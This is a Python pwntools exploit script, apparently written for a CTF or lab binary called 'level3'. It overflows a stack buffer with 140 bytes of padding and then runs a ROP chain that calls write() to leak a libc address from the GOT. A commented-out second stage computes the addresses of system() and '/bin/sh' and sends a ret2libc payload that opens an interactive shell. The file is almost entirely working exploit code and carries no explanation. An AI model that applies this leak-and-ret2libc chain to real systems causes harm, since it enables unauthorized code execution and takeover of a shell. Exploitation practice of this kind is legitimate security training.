from pwn import *
import struct


libc = ELF('libc.so')
elf = ELF('level3')

p = process('./level3')
#p = remote('127.0.0.1', 10003)

plt_write = elf.symbols['write']
print 'plt_write= ' + hex(plt_write)
got_write = elf.got['write']
print 'got_write= ' + hex(got_write)
vulfun_addr = 0x8049172
print 'vulfun= ' + hex(vulfun_addr)



#payload1 = 'a'*140 + hex(plt_write) + hex(vulfun_addr) + hex(1)+ hex(got_write)+ hex(4)

payload1 = 'a'*140 + struct.pack("I", plt_write) + struct.pack("I",vulfun_addr) + struct.pack("I",1) +struct.pack("I",got_write)+ struct.pack("I",4)


print payload1
print "\n###sending payload1 ...###"
p.send(payload1)

print "\n###receving write() addr...###"
write_addr = u32(p.recv(4))
#print 'write_addr=' + hex(write_addr)

# print "\n###calculating system() addr and \"/bin/sh\" addr...###"
# libcwrite=libc.symbols['write'] 
# print "libcwrite "+hex(libcwrite)
# libcsystem=libc.symbols['system']
# print "libcsystem "+hex(libcsystem)
# resta=libcwrite-libcsystem
# print(hex(resta))

# system_addr = write_addr - resta

# print 'system_addr= ' + hex(system_addr)
# binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
# print 'binsh_addr= ' + hex(binsh_addr)

# payload2 = 'a'*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)

# print "###sending payload2 ...###"
# p.send(payload2)

# p.interactive()
